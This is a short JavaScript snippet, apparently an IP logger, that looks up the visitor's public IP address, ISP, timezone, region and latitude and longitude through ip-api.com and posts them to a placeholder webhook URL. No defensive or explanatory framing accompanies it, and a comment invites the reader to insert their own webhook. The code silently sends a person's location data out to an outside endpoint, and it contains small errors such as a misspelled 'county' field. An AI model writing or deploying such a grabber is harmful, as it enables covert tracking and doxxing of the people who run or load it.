const webhookUrl = "WEBHOOK_URL"; // Replace with your webhook URL

fetch("http://ip-api.com/json/")
  .then(response => response.json())
  .then(data => {
    const payload = {
      content: "```" + "Ip Adress: " + data.query + "\nISP: " + data.isp + "\nTimezone: " + data.timezone + "\nCountry: " + data.county + "\nState/Region: "+ data.regionName + "\nExact Location: " + data.lat + ", " + data.lon +"```",
    };

    return fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });
  })
  .then(() => console.log("success."))
  .catch(error => console.error(error));
